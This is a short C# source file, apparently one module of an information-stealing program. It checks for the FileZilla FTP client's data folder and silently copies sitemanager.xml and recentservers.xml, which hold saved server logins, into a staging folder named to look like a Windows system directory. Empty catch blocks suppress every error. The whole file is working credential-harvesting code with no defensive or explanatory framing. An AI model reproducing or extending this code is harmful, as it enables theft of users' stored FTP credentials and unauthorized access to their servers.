using System;
using System.IO;

namespace f1lezilla
{
    class filezilla
    {
        public static void file()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla";
                if (Directory.Exists(path))
                {
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/FileZilla");
                    string[] arr = Directory.GetFiles(path);
                    foreach (string fs in arr)
                    {
                        if (fs == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\sitemanager.xml")
                        {
                            try
                            {
                                File.Copy(fs, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/FileZilla/sitemanager.xml");
                            }
                            catch
                            {

                            }

                        }
                        if (fs == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\FileZilla\recentservers.xml")
                        {
                            try
                            {
                                File.Copy(fs, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/FileZilla/recentservers.xml");
                            }
                            catch
                            {

                            }
                        }
                    }
                }
            }
            catch
            {

            }

        }
    }
}
